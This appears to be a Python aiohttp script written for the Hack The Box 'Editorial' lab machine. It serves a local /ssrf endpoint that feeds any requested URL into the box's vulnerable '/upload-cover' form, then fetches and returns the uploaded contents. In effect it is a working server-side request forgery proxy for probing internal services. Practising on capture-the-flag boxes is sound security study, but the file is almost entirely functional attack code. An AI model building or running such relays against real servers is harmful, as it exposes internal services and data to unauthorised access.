import asyncio
import aiohttp
from aiohttp import web
import json

# vulnerable page
ssrfpage = "/upload-cover"

def AsFormContent(requestto):
        data = aiohttp.FormData()
        data.add_field('bookurl',
                requestto)
        data.add_field('bookfile',
                '',
                filename='aaa.txt',
                content_type='application/octet-stream')
        return data

# box is uploading the page at the requested url to its own page, fetch contents and return
async def FetchPageContent(session,url):
        async with session.get(url) as resp:
                if resp.status != 200:
                        print(f"couldn't fetch {resp.status} @ {url}",flush=True)
                        return f"Could not fetch contents: {resp.status} @ {url}"
                pagecont = await resp.text()
                #print(f"got {pagecont} @ {url}",flush=True)
                
                
                # some are json, for ease of reading:
                try:
                        return json.loads(pagecont)
                except:
                        return pagecont

async def SendSSRFRequest(session,urlrequested):
        async with session.post(ssrfpage,
                data=AsFormContent(urlrequested)) as resp:
                        if resp is None:
                                #print(f"ERROR: req for {urlrequested} got none response",flush=True)
                                return { "Success": False, "Requested": urlrequested }

                        status = resp.status
                        uploadedto = await resp.text()

                        if status != 200:
                                #print(f"ERROR: req for {urlrequested} gave {status}:{uploadedto}",flush=True)
                                return { "Success": False,  "Requested": urlrequested }
                        if "unsplash_photo_1630734277837_ebe62757b6e0" not in uploadedto:
                                #print(f"hit on port {urlrequested}: {uploadedto}",flush=True)
                                pagecont = await FetchPageContent(session,f"/{uploadedto}")
                                return { "Success": True,  "Requested": urlrequested, "Content": pagecont }
                        #print(f"Default fail",flush=True)
                        return { "Success": False,  "Requested": urlrequested }

# performs ssrf on vuln page w/in htb editorial
# Request docs: https://docs.aiohttp.org/en/stable/web_reference.html#request-and-base-request
async def ssrf_handler(request):
        # Note: not reusing session, need to figure out how to do so w/in the event loop
        # (class var?)
        async with aiohttp.ClientSession('http://10.10.11.20', headers={"Host": "editorial.htb"}) as session:
                print(f"Requesting {request.query['u']}...", flush=True)
                #res = await asyncio.gather(*[SendSSRFRequest(session, request.query['u'])])
                res = await SendSSRFRequest(session, request.query['u'])
                print(f"Request: \n{request.query['u']}\nResult: \n{res}")
                return web.json_response(res, status=200) if res["Success"] else web.json_response(res, status=404)


app = web.Application()
app.add_routes([web.route('*', '/ssrf', ssrf_handler)])

web.run_app(app,port=3131)

